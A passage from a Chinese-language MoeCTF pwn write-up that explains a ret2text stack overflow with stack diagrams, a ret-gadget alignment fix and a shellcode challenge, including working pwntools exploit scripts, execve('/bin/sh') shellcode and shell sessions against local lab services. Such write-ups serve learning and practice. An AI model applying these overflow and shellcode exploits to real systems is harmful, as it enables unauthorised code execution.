io.recvuntil(b"Here is the hint.")
leaked_bytes = io.read(8)
log.info(f"Leaked raw bytes: {leaked_bytes}")

the_number = u64(leaked_bytes)
log.info(f"Decoded number: {the_number}")

io.sendlineafter(b">", str(the_number))
io.interactive()
```

进入 `interactive` 模式后，只需注意到 `flag` 位于 `./flag` 中。

```plain
cat flag
[DEBUG] Sent 0x1 bytes:
    b'c'
[DEBUG] Sent 0x1 bytes:
    b'a'
[DEBUG] Sent 0x1 bytes:
    b't'
[DEBUG] Sent 0x1 bytes:
    b' '
[DEBUG] Sent 0x1 bytes:
    b'f'
[DEBUG] Sent 0x1 bytes:
    b'l'
[DEBUG] Sent 0x1 bytes:
    b'a'
[DEBUG] Sent 0x1 bytes:
    b'g'
[DEBUG] Sent 0x1 bytes:
    b'\n'
[DEBUG] Received 0x2a bytes:
    b'moectf{uSEfUl_thlNgs_1n-pwNTO0156775935f}\n'
moectf{uSEfUl_thlNgs_1n-pwNTO0156775935f}
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 13580
```

## 2 EZtext

> [!NOTE]
> 虽说是 `EZtext`，但对于星澜音这种纯粹的新手而言并不 easy……星澜音又花了整整一天时间弄懂这道题背后的全部逻辑……😭😭不过的确还好：星澜音第一次学会诸如堆栈结构、函数调用之类的东西，其实也应当算是收获满满了w——
>
> **FLAG:** `moectf{r3TZtExt_I5-tH3-5tart-0f_RoP7db14b3}`

用 IDA Pro 逆向题目给定的 `pwn` 文件。首先观察一下 `main` 函数：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
    unsigned int v4; // [rsp+Ch] [rbp-4h] BYREF

    init(argc, argv, envp);
    puts("Stack overflow is a powerful art!");
    puts("In this MoeCTF,I will show you the charm of PWN!");
    puts("You need to know the struct of stack first.");
    puts("Then how many bytes do you need to overflow the stack?");
    __isoc99_scanf("%d", &v4);
    overflow(v4);
    return 0;
}
```

`main` 函数调起 `init` 函数，后者设置无缓冲区模式后，前者打印四行文本，并要求用户输入，由 `scanf`（准确来说是 C99 标准下的 `__isoc99_scanf`）从标准输入中读取一个十进制整数，将该整数作为参数传入 `overflow` 函数。下面我们来看 `overflow` 函数：

```c
int __fastcall overflow(int a1)
{
    char buf[8]; // [rsp+18h] [rbp-8h] BYREF

    if ( a1 <= 7 )
        return puts("Come on, you can't even fill this array!");
    read(0, buf, a1);
    return puts("OK,I receive your byte.and then?");
}
```

`overflow` 函数会在栈内申请一个大小为 8 字节的 `buf` 字符数组，随后先判断 `a1` 的值是否大于等于 8，若否，则直接返回；若是，则继续从标准输入读取至多 `a1` 字节大小的数据并填充到 `buf` 中。但…整个程序到这就…结束了？

是的，看起来的确是这样。我们在 IDA Pro 中仔细寻找，终于找出了另一个函数：`treasure`！它长这样：

```c
int treasure()
{
    puts("Congratulations! You got the secret!");
    return system("/bin/sh");
}
```

拿到了 `/bin/sh` 我们就可以为所欲为了！但问题是，整个程序的主逻辑与 `treasure` 八竿子打不着，到底怎么样才能想办法跳到 `treasure` 里呢？我们想到了面向结果编程，也就是大名鼎鼎的——**Return-Oriented Programming (ROP)**。

关于 ROP 的基础知识，星澜音是在 Hello CTF 的 [这篇文章](https://hello-ctf.com/hc-pwn/ROP/) 上了解的。

为了构造 ROP 链，我们首先需要了解清楚栈的结构。不妨从 `overflow` 函数先下手。在 `main` 函数调起 `overflow` 函数前，我们粗略画出栈的结构。若无特别说明，以下结构均为高内存地址在上、低内存地址在下。

```plain
** High Address **

 --------------------  <- rbp
| `main` stack frame |
 --------------------  <- rsp

** Low Address **
```

随后 `main` 进行 `call overflow` 操作。在 IDA Pro 上追踪 `overflow` 的汇编代码，我们有

```asm
; Attributes: bp-based frame

; int __fastcall overflow(int)
public overflow
overflow proc near

var_14= dword ptr -14h     ; 14h = 20 bytes
buf= byte ptr -8           ; 8 bytes

; __unwind {
endbr64
push    rbp                ; Step 1
mov     rbp, rsp           ; Step 2
sub     rsp, 20h           ; Step 3, 20h = 32 bytes
mov     [rbp+var_14], edi  ; Step 4
cmp     [rbp+var_14], 7    ; Step 5
jg      short loc_401205
```

我们对这段代码进行模拟：

执行 `call` 的时候，`rsp` 先向下移动，随后在 `main` 栈帧的下面压入 `main` 的返回地址。

```plain
** High Address **

 -----------------------  <- rbp
|  `main` stack frame   |
 -----------------------
| `main` return address |
 -----------------------  <- rsp

** Low Address **
```

Step 1 时，`rbp`（Base Pointer，栈基底指针）的当前地址被压栈。压栈过程中，通常 `rsp`（Stack Pointer，栈指针）先向低内存地址移动数个单位，随后数据填充到栈内。栈如下所示：

```plain
** High Address **

 -----------------------  <- rbp
|  `main` stack frame   |
 -----------------------
| `main` return address |
 -----------------------
|      saved `rbp`      |
 -----------------------  <- rsp

** Low Address **
```

Step 2 时，将 `rsp` 的值赋给 `rbp`，也就是说，`rbp` 现在移动到了 `rsp` 的位置。

```plain
** High Address **

 -----------------------
|  `main` stack frame   |
 -----------------------
| `main` return address |
 -----------------------
|      saved `rbp`      |
 -----------------------  <- rbp, rsp

** Low Address **
```

Step 3 时，`rsp` 的地址向低内存地址移动了 `20h` 个字节，也就是 32 个字节。

```plain
** High Address **

 -----------------------
|  `main` stack frame   |
 -----------------------
| `main` return address |
 -----------------------
|      saved `rbp`      |
 -----------------------  <- rbp
|                       |          \
|                       |          | --> 32 bytes
|                       |          /
 -----------------------  <- rsp (rbp-32)

** Low Address **
```

Step 4 时，将 `edi` 的值写入 `[rbp-14h]` 的位置，也就是 `rbp` 下方 20 字节处。`edi` 的值来自于我们调用 `overflow` 函数时传入的 `a1`，也就是询问我们的字节数，它本身占用 4 个字节。写入数据时，通常从低内存地址向高内存地址开始写，我们所说的写入的位置，指开始写入时的位置。

```plain
** High Address **

 -----------------------
|  `main` stack frame   |
 -----------------------
| `main` return address |
 -----------------------
|      saved `rbp`      |
 -----------------------  <- rbp
|                       |             \
 -----------------------  <- rbp-16   |
|  /////// a1 ///////   |             | --> 32 bytes
 -----------------------  <- rbp-20   |
|                       |             /
 -----------------------  <- rsp (rbp-32)

** Low Address **
```

Step 5 时，`cmp` 比较器进行一次比较。类 C 语言代码很清晰地看到，我们需要让 `a1` 的值大于等于 8，故我们直接展开追踪 `short loc_401205` 的汇编代码：

```asm
loc_401205:
mov     eax, [rbp+var_14]
movsxd  rdx, eax        ; nbytes
lea     rax, [rbp+buf]        ; Step 6
mov     rsi, rax        ; buf
mov     edi, 0          ; fd
call    _read
lea     rax, aOkIRecvieveYou
mov     rdi, rax        ; s
call    _puts
nop
```

Step 6 用到了 `lea` 指令，表示加载 `[rbp-8]` 的有效地址到 `rax` 寄存器，后续又正式加载到了 `rsi` 寄存器。这没有改变栈结构，直到 `call _read` 出现——`_read` 取 `rsi` 寄存器内的地址并开始向其中填充数据，

```plain
** High Address **

 -----------------------
|  `main` stack frame   |
 -----------------------
| `main` return address |
 -----------------------
|      saved `rbp`      |
 -----------------------  <- rbp
|  \\\\\\ DATA \\\\\\   |             \   ↑  ↑  ↑  ↑  ↑
 -----------------------  <- rbp-8    | - - - `buf` - - -
|                       |             |
 -----------------------  <- rbp-16   | --> 32 bytes
|  /////// a1 ///////   |             |
 -----------------------  <- rbp-20   |
|                       |             /
 -----------------------  <- rsp (rbp-32)

** Low Address **
```

而这，就是问题所在！我们先前讨论过 `read()` 函数的性质，在本例中，它至多向 `buf` 写入 `a1` 个字节的数据，但这个 `a1` 完全没有限定！当我们从 `buf` 的起始地址开始向标准输入写入数据时，数据如果过多，就会冲破 `rbp` 的界限，写到 `saved rbp`、直指 `main return address` 里！

但在这之前，我们不妨先思考一下，函数调用结束，即将返回的时候发生了什么。通常情况下，函数该返回的时候，它们会进行两条指令：

```asm
leave     ; Step 7
retn      ; Step 8, also `ret`
```

这里的 `retn` 是 `return near` 的缩写，属于一个历史遗留问题，在 32 位和 64 位的程序反编译中，我们直接将其理解为 `ret` 就好。

Step 7 中，`leave` 会先进行一步 `mov rsp, rbp`。它将 `rbp` 的值直接赋给 `rsp`，也就是将 `rsp` 直接 TP(?) 到 `rbp` 那里。原先 `rsp` 和 `rbp` 之间的所有栈结构会被直接抛弃。当然，这里的「直接抛弃」并不是给这段栈里全部填充 `0`，而是通过改变 `rsp` 的值，直接忽略掉了这片内存区域。

```plain
** High Address **

 -----------------------
|  `main` stack frame   |
 -----------------------
| `main` return address |
 -----------------------
|      saved `rbp`      |
 -----------------------  <- rbp, rsp
|\\\\\\\\\\\\\\\\\\\\\\\|             \
|\\\\\\\\\\\\\\\\\\\\\\\|             | - - - `buf` - - -
|\\\\\\\\\ NOT \\\\\\\\\|             |
|\\\\\\\\ BEING \\\\\\\\|             | --> 32 bytes
|\\\\\\\\\ USED \\\\\\\\|             |
|\\\\\\\\\\\\\\\\\\\\\\\|             |
|\\\\\\\\\\\\\\\\\\\\\\\|             /
 -----------------------

** Low Address **
```

随后再进行一步 `pop rbp`。这时，CPU 会从 `rsp` 的位置开始向上读取 8 个字节的数据，并将其加载回 `rbp`，也就是将 `rbp` TP(?) 到数据对应的地址那里。紧随其后地，`rsp` 再向上自己走 8 个字节。这样的话，栈结构就被复原到 `call` 之后的样子了。

```plain
** High Address **

 -----------------------  <- rbp
|  `main` stack frame   |
 -----------------------
| `main` return address |
 -----------------------  <- rsp
|\\\\\ saved `rbp` \\\\\|
 -----------------------
|\\\\\\\\\\\\\\\\\\\\\\\|             \
|\\\\\\\\\\\\\\\\\\\\\\\|             |
|\\\\\\\\\ NOT \\\\\\\\\|             |
|\\\\\\\\ BEING \\\\\\\\|             | --> 32 bytes
|\\\\\\\\\ USED \\\\\\\\|             |
|\\\\\\\\\\\\\\\\\\\\\\\|             |
|\\\\\\\\\\\\\\\\\\\\\\\|             /
 -----------------------

** Low Address **
```

事实上，Step 7 可以理解为一个打扫屋子的过程，而 Step 8 就是一个交还钥匙的过程。`retn`，或者我们直接称为 `ret`，执行了一步 `pop rip`。`RIP` 是程序指针，它指示 CPU 应该从哪里继续进行程序。在这一步中，CPU 从 `rsp` 所在的地方向上读取 8 个字节数据，并直接传入 `rip` 中，随后 `rsp` 自身再向上移动 8 个字节。栈结构此时被完全还原；而我们的 CPU 也会在接下来直接按照 `RIP` 的指示去执行指令。就好像，`overflow` 函数从来没有被调用过一样。

```plain
** High Address **

 -----------------------  <- rbp
|  `main` stack frame   |
 -----------------------  <- rsp
|\`main` return address\|      --> to rip
 -----------------------
|\\\\\ saved `rbp` \\\\\|
 -----------------------
|\\\\\\\\\\\\\\\\\\\\\\\|
|\\\\\\\\\\\\\\\\\\\\\\\|
|\\\\\\\\\ NOT \\\\\\\\\|
|\\\\\\\\ BEING \\\\\\\\|
|\\\\\\\\\ USED \\\\\\\\|
|\\\\\\\\\\\\\\\\\\\\\\\|
|\\\\\\\\\\\\\\\\\\\\\\\|
 -----------------------

** Low Address **
```

我们应当能够想到了——回到刚才的话题，我们可以向标准输入中多写一点东西，直接冲到 `main return address` 里！那么我们究竟要写什么呢？既然我们只关心覆盖到 `main return address` 的部分，那其实前面的部分，我们想写什么就写些什么好了，只是前面的部分到底写多少，值得我们好好考量一下。再看看栈结构：

```plain
** High Address **

 -----------------------
|  `main` stack frame   |
 -----------------------  <- rbp+16
| `main` return address |
 -----------------------  <- rbp+8
|      saved `rbp`      |
 -----------------------  <- rbp
|  \\\\\\ DATA \\\\\\   |                ↑  ↑  ↑  ↑  ↑
 -----------------------  <- rbp-8     - - - START - - -
|                       |             
           ...

** Low Address **
```

没错！从 `START` 开始向高内存地址写入，首先随便填充一个 8 字节的数据，其次再随便填充一个 8 字节的数据（覆盖掉 `saved rbp`），最后再填充一个 8 字节的 `treasure` 地址，这样程序返回的时候，就可以直接返回到 `treasure` 了！非常天才的主意！

但多愁善感的人可能会疑惑：这样粗鲁的覆盖，直接干掉了 `saved rbp` 和 `main return address`，那 `main` 怎么办？事实上，从理性的角度来讲，`main` 还真没办法。就好比我们是入室盗窃的小偷（？），从庭院走到门口拿钥匙开锁，那么这中间路上的地毯，是我们必须要踩上去的。况且在调用 `overflow` 的时候，`main` 已经处于了一个类似于休眠的状态——它一直等着 `overflow` 执行完回来叫它，只要没人叫它，它就一直睡着。不过我们现在没必要返回 `main` 了，因为我们要返回的是 `overflow`，所以我们也没必要叫醒 `main`；它的返回地址和预先保留的 `rbp`，该怎么覆盖也不会吵醒它；而至于 `rbp` 究竟要去哪，我们后续自会决定。~~相当于是给 `main` 安乐死了，所以还是比较人道的。~~

构造 Pwntools 脚本如下：

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

io = connect('127.0.0.1', 4807)

TREASURE_ADDR = 0x4011b6

payload = b'LYRINLOVESDRYICE' + p64(TREASURE_ADDR)
log.info(f"Payload constructed with length: {len(payload)}")

io.sendlineafter(b'overflow the stack?', str(len(payload)).encode())
io.send(payload)

io.interactive()
```

运行，输出！

```plain
PS S:\MoeCTF\Pwn\2> python .\flag.py
[x] Opening connection to 127.0.0.1 on port 4807
[x] Opening connection to 127.0.0.1 on port 4807: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 4807: Done
[*] Payload constructed with length: 24
[DEBUG] Received 0xc3 bytes:
    b'Stack overflow is a powerful art!\n'
    b'In this MoeCTF,I will show you the charm of PWN!\n'
    b'You need to understand the structure of the stack first.\n'
    b'Then how many bytes do you need to overflow the stack?\n'
[DEBUG] Sent 0x3 bytes:
    b'24\n'
[DEBUG] Sent 0x18 bytes:
    00000000  4c 59 52 49  4e 4c 4f 56  45 53 44 52  59 49 43 45  │LYRI│NLOV│ESDR│YICE│
    00000010  b6 11 40 00  00 00 00 00                            │··@·│····│
    00000018
[*] Switching to interactive mode

[DEBUG] Received 0x20 bytes:
    b'OK,I receive your byte.and then?'
OK,I receive your byte.and then?[DEBUG] Received 0x26 bytes:
    b'\n'
    b'Congratulations! You got the secret!\n'

Congratulations! You got the secret!
[*] Got EOF while reading in interactive
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 4807
```

嗯\~跳转成功……哎你怎么似了？😰

很遗憾，我们在进入 `interactive` 模式的时候突发 EOF，程序崩了。可能有人认为是网络问题，但是多试了几次之后，发现问题依旧。太诡异了。

我们重新捋一下思路：按道理，既然已经显示出了 `Congratulations! You got the secret!`，证明的确已经进入了 `treasure` 函数的逻辑，也就是说，它没有道理不执行 `return system("/bin/sh");` 这一行命令。事实上我们即使用逻辑也能推断出，程序绝对是走到了这里的，但走到这里之后呢，去了哪里，我们便无从得知了。

> [!TIP]
>
> 在 Linux 系统中，`system` 通常是一个阻塞型命令。它会等待用户执行结束后才会以返回值返回。因此，就算是跳转出 `treasure` 命令的时候程序才崩溃，也应该是我们拿完 `flag` 之后才崩溃。但既然我们现在根本无法进入 `/bin/sh`，那么就说明问题一定是出在 `return system("/bin/sh")` 这一行。

我们在题目 0 中了解过，Pwntools 也可以对本地文件进行调试，只需要将其附加到 `gdb` 上即可。构造如下 Pwntools 脚本：

```python
from pwn import *

context.binary = './pwn'
TREASURE_ADDR = 0x4011b6

payload = b'LYRINLOVESDRYICE' + p64(TREASURE_ADDR)
log.info(f"Payload constructed with length: {len(payload)}")

io = gdb.debug('./pwn', gdbscript=f'''
break *{hex(TREASURE_ADDR)}
continue
''')

io.sendlineafter(b'overflow the stack?', str(len(payload)).encode())
io.send(payload)
io.interactive()
```

运行，输出：

```plain
┌──(stellalyrin㉿lyrin-A16)-[~/MoeCTF/Pwn/2]
└─$ python ./flag.py
[*] '/home/stellalyrin/MoeCTF/Pwn/2/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] Payload constructed with length: 24
[+] Starting local process '/usr/bin/gdbserver': pid 153747
[*] running in new terminal: ['/usr/bin/gdb', '-q', './pwn', '-x', '/tmp/pwnlib-gdbscript-7rdw_qfr.gdb']
[*] Switching to interactive mode

OK,I receive your byte.and then?
Congratulations! You got the secret!

Child terminated with signal = 0xb (SIGSEGV)
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Process '/usr/bin/gdbserver' stopped with exit code 0 (pid 153750)
```

可以看到，在 `treasure` 运行之前时，程序都还非常正常；但的确，一进入 `system` 指令，程序立刻抛出 `SIGSEGV` 异常（Segmentation Violation，段错误）。何意味？于是只能带着这些错误日志去问 AI 了，结果问出了一个特别致命的东西：**函数调用栈对齐**。

> [!TIP]
>
> 在 Linux（尤其是 x86-64 架构）下，ABI（Application Binary Interface）规范规定函数调用时，栈指针 `RSP` 必须在调用点对齐到 16 字节边界。

具体来说，在 64 位 Linux 常见的 System V ABI 下：我们调用一个函数的时候，调用者必须保证其在执行 `call` 指令时，栈顶 `RSP` 必须是 16 字节对齐的。SSE/AVX 指令集只有这样才能高效读写寄存器，也能避免不必要的性能开销。

一般的 `call` 的调用者一定会保证 `RSP` 在 16 字节对齐，随后 `call` 将返回地址（8 字节）压栈，进入被调函数后，便会 `RSP % 16 = 8`。但问题是，我们引导程序进入 `treasure` 函数时，并没有使用正常的 `call` 指令！

不妨再看一下 `treasure` 函数的汇编代码：

```asm
; Attributes: bp-based frame

; int treasure()
public treasure
treasure proc near
; __unwind {
endbr64
push    rbp
mov     rbp, rsp
lea     rax, s          ; "Congratulations! You got the secret!"
mov     rdi, rax        ; s
call    _puts
lea     rax, command    ; "/bin/sh"
mov     rdi, rax        ; command
call    _system
nop
pop     rbp
retn
; } // starts at 4011B6
treasure endp
```

可以画出进入 `treasure` 时的栈结构：

```plain
** High Address **

 ----------------------
|  `main` stack frame  |
 ----------------------  <- rsp   ; % 16 = 0
|  `treasure` address  |
 ----------------------           ; % 16 = 8
|  \\\\\\ DATA \\\\\\  |
 ----------------------           ; % 16 = 0
|  \\\\\\ DATA \\\\\\  |
 ----------------------
|                      |
           ...

** Low Address **
```

接下来，`rbp` 压栈，但唯独需要注意的是，因为我们之前覆盖 `main return address` 时已经覆盖掉了 `saved RBP`，所以现在这个 `rbp` 在哪我们也不清楚：

```plain
** High Address **

 ----------------------
|  `main` stack frame  |
 ----------------------
|  ??? saved `RBP` ??? |
 ----------------------  <- rsp   ; % 16 = 8
|  \\\\\\ DATA \\\\\\  |
 ----------------------
|  \\\\\\ DATA \\\\\\  |
 ----------------------
|                      |
           ...

** Low Address **
```

不过新的 `rbp` 很快就会移动到 `rsp` 处：

```plain
** High Address **

 ----------------------
|  `main` stack frame  |
 ----------------------
|  ??? saved `RBP` ??? |
 ----------------------  <- rsp,  ; % 16 = 8
|  \\\\\\ DATA \\\\\\  |    rbp
 ----------------------
|  \\\\\\ DATA \\\\\\  |
 ----------------------
|                      |
           ...

** Low Address **
```

问题便显现了：我们在 `call system` 的时候，没有保证 RSP 的 16 字节对齐！但明明调用 `_puts` 的时候，RSP 也没有 16 字节对齐，为何 `_puts` 可以正常运行，但 `system` 不行呢？个人推测，`_puts` 的逻辑比较简单，所以 16 字节未对齐的影响并不是很大；但 `system` 就比较复杂，它要求调用点对齐必须成立，因为 `system` 可能会调用诸如 `movaps` 或 `movdqa` 之类的指令，而这些指令是必须要求对齐的。如果我们不对齐，那就指定 SIGSEGV 了。

那么怎么才能让它在调用前 16 字节对齐呢？我们需要借助一个神秘的东西：**ROP gadget**。

```plain
┌──(stellalyrin㉿lyrin-A16)-[~/MoeCTF/Pwn/2]
└─$ ROPgadget --binary ./pwn --only "ret"
Gadgets information
============================================================
0x000000000040101a : ret

Unique gadgets found: 1
```

这里找到一个仅含 `ret` 的 gadget。我们探讨过 `ret` 的性质。这里，先给出 payload 的构造：它由 16 个字节的任意数据，一个 `ret` gadget 的地址和一个 `treasure` 的地址组成。由于 `ret` 会 `pop` 掉栈内 8 个字节的数据，它便巧妙地将栈 16 字节对齐了！

经过 `ret` 的 `pop` 后，进入 `treasure` 的栈结构如图所示：

```plain
** High Address **

 ----------------------  <- rsp   ; % 16 = 8
|  `treasure` address  |
 ----------------------           ; % 16 = 0
|    `ret` address     |
 ----------------------           ; % 16 = 8
|  \\\\\\ DATA \\\\\\  |
 ----------------------           ; % 16 = 0
|  \\\\\\ DATA \\\\\\  |
 ----------------------
|                      |
           ...

** Low Address **
```

仍然进行一步 `rbp` 压栈：

```plain
** High Address **

 ----------------------           ; % 16 = 8
| ??? saved `rbp` ???? |
 ----------------------  <- rsp   ; % 16 = 0
|    `ret` address     |
 ----------------------           ; % 16 = 8
|  \\\\\\ DATA \\\\\\  |
 ----------------------           ; % 16 = 0
|  \\\\\\ DATA \\\\\\  |
 ----------------------
|                      |
           ...

** Low Address **
```

之后，我们就会发现，此时的 `rsp` 终于 16 字节对齐了！现在，`system` 指令就能完美进行！

构造 Pwntools 脚本如下：

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

io = connect('127.0.0.1', 13202)

TREASURE_ADDR = 0x4011b6
GADGET_ADDR = 0x40101a

payload = b'LYRINLOVESDRYICE' + p64(GADGET_ADDR) + p64(TREASURE_ADDR)
log.info(f"Payload constructed with length: {len(payload)}")

io.sendlineafter(b'overflow the stack?', str(len(payload)).encode())
io.send(payload)
io.interactive()
```

运行：

```plain
PS S:\MoeCTF\Pwn\2> python .\flag.py
[x] Opening connection to 127.0.0.1 on port 13202
[x] Opening connection to 127.0.0.1 on port 13202: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 13202: Done
[*] Payload constructed with length: 32
[DEBUG] Received 0xc3 bytes:
    b'Stack overflow is a powerful art!\n'
    b'In this MoeCTF,I will show you the charm of PWN!\n'
    b'You need to understand the structure of the stack first.\n'
    b'Then how many bytes do you need to overflow the stack?\n'
[DEBUG] Sent 0x3 bytes:
    b'32\n'
[DEBUG] Sent 0x20 bytes:
    00000000  4c 59 52 49  4e 4c 4f 56  45 53 44 52  59 49 43 45  │LYRI│NLOV│ESDR│YICE│
    00000010  1a 10 40 00  00 00 00 00  b6 11 40 00  00 00 00 00  │··@·│····│··@·│····│
    00000020
[*] Switching to interactive mode

[DEBUG] Received 0x20 bytes:
    b'OK,I receive your byte.and then?'
OK,I receive your byte.and then?[DEBUG] Received 0x26 bytes:
    b'\n'
    b'Congratulations! You got the secret!\n'

Congratulations! You got the secret!
ls
[DEBUG] Sent 0x1 bytes:
    b'l'
[DEBUG] Sent 0x1 bytes:
    b's'
[DEBUG] Sent 0x1 bytes:
    b'\n'
[DEBUG] Received 0x2c bytes:
    b'bin\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libexec\n'
    b'libx32\n'
    b'pwn\n'
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
cat flag
[DEBUG] Sent 0x1 bytes:
    b'c'
[DEBUG] Sent 0x1 bytes:
    b'a'
[DEBUG] Sent 0x1 bytes:
    b't'
[DEBUG] Sent 0x1 bytes:
    b' '
[DEBUG] Sent 0x1 bytes:
    b'f'
[DEBUG] Sent 0x1 bytes:
    b'l'
[DEBUG] Sent 0x1 bytes:
    b'a'
[DEBUG] Sent 0x1 bytes:
    b'g'
[DEBUG] Sent 0x1 bytes:
    b'\n'
[DEBUG] Received 0x2c bytes:
    b'moectf{r3TZtExt_I5-tH3-5tart-0f_RoP7db14b3}\n'
moectf{r3TZtExt_I5-tH3-5tart-0f_RoP7db14b3}
exit
[DEBUG] Sent 0x1 bytes:
    b'e'
[DEBUG] Sent 0x1 bytes:
    b'x'
[DEBUG] Sent 0x1 bytes:
    b'i'
[DEBUG] Sent 0x1 bytes:
    b't'
[DEBUG] Sent 0x1 bytes:
    b'\n'
[*] Got EOF while reading in interactive
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 13202
```

结束。

至于我们 `exit` 之后程序会怎么走，这其实已经不重要了。事实上，我们仍然没有为程序指定一个 `system` 之后的返回地址，但鉴于我们已经拿到了 `flag`，再多的段错误也已经和我们无关了。

## ezshellcode

> [!NOTE]
> **FLAG:** ``

首先先用 IDA Pro 反编译 `pwn` 文件：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
    int v4;              // [rsp+0h] [rbp-20h] BYREF
    int prot;            // [rsp+4h] [rbp-1Ch]
    int v6;              // [rsp+8h] [rbp-18h]
    int v7;              // [rsp+Ch] [rbp-14h]
    void *s;             // [rsp+10h] [rbp-10h]
    unsigned __int64 v9; // [rsp+18h] [rbp-8h]

    v9 = __readfsqword(0x28u);
    init(argc, argv, envp);
    s = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);
    if (s == (void *)-1LL)
    {
        perror("mmap");
        return 1;
    }
    memset(s, 0, 0x1000uLL);
    v6 = 0;
    prot = 0;
    puts("In a ret2text exploit, we can use code in the .text segment.");
    puts("But now, there is no 'system' function available there.");
    puts("How can you get the flag now? Perhaps you should use shellcode.");
    puts("But what is shellcode? What can you do with it? And how can you use it?");
    puts("I will give you some choices. Choose wisely!");
    __isoc99_scanf("%d", &v4);
    do
        v7 = getchar();
    while (v7 != 10 && v7 != -1);
    if (v4 == 4)
    {
        if (v6 == 1)
            puts("You can only make one change!");
        prot = 7;
        v6 = 1;
    }
    else
    {
        if (v4 > 4)
            goto LABEL_24;
        switch (v4)
        {
        case 3:
            if (v6 == 1)
                puts("You can only make one change!");
            prot = 4;
            v6 = 1;
            break;
        case 1:
            if (v6 == 1)
                puts("You can only make one change!");
            prot = 1;
            v6 = 1;
            break;
        case 2:
            if (v6 == 1)
                puts("You can only make one change!");
            prot = 3;
            v6 = 1;
            break;
        default:
        LABEL_24:
            puts("Invalid choice. The space remains in its chaotic state.");
            exit(1);
        }
    }
    if (mprotect(s, 0x1000uLL, prot) == -1)
    {
        perror("mprotect");
        exit(1);
    }
    puts("\nYou have now changed the permissions of the shellcode area.");
    puts("If you can't input your shellcode, think about the permissions you just set.");
    read(0, s, 0x1000uLL);
    ((void (*)(void))s)();
    return 0;
}
```

略去 Canary 保护，程序使用 `mmap` 进行了一次内存映射分配：由系统选择内存地址、分配一块可读可写的、4096 字节大小的内存；随后使用 `memset` 将这块内存全部写 `0`。接下来，程序打印提示：

> In a ret2text exploit, we can use code in the .text segment.</br>
> But now, there is no 'system' function available there.</br>
> How can you get the flag now? Perhaps you should use shellcode.</br>
> But what is shellcode? What can you do with it? And how can you use it?</br>
> I will give you some choices. Choose wisely!</br>

---

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

io = connect('127.0.0.1', 14041)

io.sendlineafter(b'Choose wisely!', b'4')

shellcode = asm(shellcraft.amd64.linux.sh())

log.info(f"Generated shellcode: {shellcode}")
log.info(f"Shellcode length: {len(shellcode)} bytes")

io.sendline(shellcode)

io.interactive()
```

```plain
┌──(stellalyrin㉿lyrin-A16)-[~/MoeCTF/Pwn/ezshellcode]
└─$ python ./flag.py
[+] Opening connection to 127.0.0.1 on port 14041: Done
[DEBUG] Received 0x12a bytes:
    b'In a ret2text exploit, we can use code in the .text segment.\n'
    b"But now, there is no 'system' function available there.\n"
    b'How can you get the flag now? Perhaps you should use shellcode.\n'
    b'But what is shellcode? What can you do with it? And how can you use it?\n'
    b'I will give you some choices. Choose wisely!\n'
[DEBUG] Sent 0x2 bytes:
    b'4\n'
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/lib/python3/dist-packages/pwnlib/data/includes
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00'] */
        /* push b'sh\x00' */
        push 0x1010101 ^ 0x6873
        xor dword ptr [rsp], 0x1010101
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 8
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push 59 /* 0x3b */
        pop rax
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-7jit6wcz/step2 /tmp/pwn-asm-7jit6wcz/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-7jit6wcz/step3 /tmp/pwn-asm-7jit6wcz/step4
[*] Generated shellcode: b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
[*] Shellcode length: 48 bytes
[DEBUG] Sent 0x31 bytes:
    00000000  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
    00000010  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
    00000020  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
    00000030  0a                                                  │·│
    00000031
[*] Switching to interactive mode

[DEBUG] Received 0x8a bytes:
    b'\n'
    b'You have now changed the permissions of the shellcode area.\n'
    b"If you can't input your shellcode, think about the permissions you just set.\n"

You have now changed the permissions of the shellcode area.
If you can't input your shellcode, think about the permissions you just set.
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x2c bytes:
    b'bin\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libexec\n'
    b'libx32\n'
    b'pwn\n'
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2f bytes:
    b'moectf{P0wERfuI_SHE1Ic0de_C@n-Do-ANyThING3180}\n'
moectf{P0wERfuI_SHE1Ic0de_C@n-Do-ANyThING3180}
$ exit
